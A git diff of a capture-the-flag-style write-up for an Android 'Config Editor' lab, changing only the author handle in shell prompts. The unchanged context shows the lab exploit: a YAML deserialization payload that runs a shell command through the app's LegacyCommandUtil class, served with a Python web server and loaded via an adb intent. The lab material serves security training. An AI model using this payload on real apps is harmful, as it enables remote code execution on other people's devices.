@@ -1,5 +1,5 @@
 ---
-author: pl4int3xt
+author: 0xbinder
 layout: post
 title: Lab - Config Editor
 date: '2024-07-03'
@@ -27,7 +27,7 @@ Welcome to the Config Editor Challenge! In this lab, you'll dive into a realisti
 Let's download vpn file and use adb to connect to the lab
 
 ```shell
-pl4int3xt@archlinux ~> adb connect 10.11.1.1:5001 
+0xbinder@archlinux ~> adb connect 10.11.1.1:5001 
 * daemon not running; starting now at tcp:5037
 * daemon started successfully
 connected to 10.11.1.1:5001
@@ -40,22 +40,22 @@ Opening the app we get this screen that allows us to load and save a yml file
 Let's locate the third party apps installed with adb 
 
 ```shell
-pl4int3xt@archlinux ~> adb shell pm list packages -3
+0xbinder@archlinux ~> adb shell pm list packages -3
 package:com.mobilehackinglab.configeditor
-pl4int3xt@archlinux ~> 
+0xbinder@archlinux ~> 
 ```
 
 Let's get the path of the config editor app
 
 ```shell
-pl4int3xt@archlinux ~> adb shell pm path com.mobilehackinglab.configeditor
+0xbinder@archlinux ~> adb shell pm path com.mobilehackinglab.configeditor
 package:/data/app/~~7nJyEbpomszhvZKacYpBDQ==/com.mobilehackinglab.configeditor-Xlgn336TGw-b6-q5Xmjmyg==/base.apk
 ```
 
 Let's pull the app for static analysis with jadxgui
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> adb pull /data/app/~~7nJyEbpomszhvZKacYpBDQ==/com.mobilehackinglab.configeditor-Xlgn336TGw-b6-q5Xmjmyg==/base.apk
+0xbinder@archlinux ~/D/mobile-hacking> adb pull /data/app/~~7nJyEbpomszhvZKacYpBDQ==/com.mobilehackinglab.configeditor-Xlgn336TGw-b6-q5Xmjmyg==/base.apk
 /data/app/~~7nJyEbpomszhvZKacYpBDQ==/com.mobilehackin...lled, 0 skipped. 0.0 MB/s (5862286 bytes in 136.045s)
 ```
 
@@ -217,7 +217,7 @@ rce: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /data/data/co
 ```
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> bat rce.yml
+0xbinder@archlinux ~/D/mobile-hacking> bat rce.yml
 ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: rce.yml
 ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────
@@ -229,20 +229,20 @@ pl4int3xt@archlinux ~/D/mobile-hacking> bat rce.yml
 Let's get our ip with the following commands to serve the file
 
 ```shell
-pl4int3xt@archlinux ~> ip a s tap0
+0xbinder@archlinux ~> ip a s tap0
 ```
 
 Let's start the python server to serve the file
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> python3 -m http.server
+0xbinder@archlinux ~/D/mobile-hacking> python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 Next we use adb to launch the `MainActivity` with an implicit intent that gets the file we served with python
 
 ```shell
-pl4int3xt@archlinux ~> adb shell am start -a android.intent.action.VIEW -d  "http://10.11.3.2:8000/rce.yml" -n
+0xbinder@archlinux ~> adb shell am start -a android.intent.action.VIEW -d  "http://10.11.3.2:8000/rce.yml" -n
  com.mobilehackinglab.configeditor/.MainActivity
 Starting: Intent { act=android.intent.action.VIEW dat=http://10.11.3.2:8000/... cmp=com.mobilehackinglab.configeditor/.MainActivity }
 ```
@@ -250,7 +250,7 @@ Starting: Intent { act=android.intent.action.VIEW dat=http://10.11.3.2:8000/... 
 The file was served successfully
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> python3 -m http.server
+0xbinder@archlinux ~/D/mobile-hacking> python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.11.0.1 - - [03/Jul/2024 14:33:18] "GET /rce.yml HTTP/1.1" 200 -
 ```
@@ -262,6 +262,6 @@ The app shows this meaning the exploit run
 we then pull the file with adb to confirm that it was written successfully
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> adb pull /data/data/com.mobilehackinglab.configeditor/proof.txt
+0xbinder@archlinux ~/D/mobile-hacking> adb pull /data/data/com.mobilehackinglab.configeditor/proof.txt
 /data/data/com.mobilehackinglab.configeditor/proof.txt: 1 file pulled, 0 skipped.
 ```
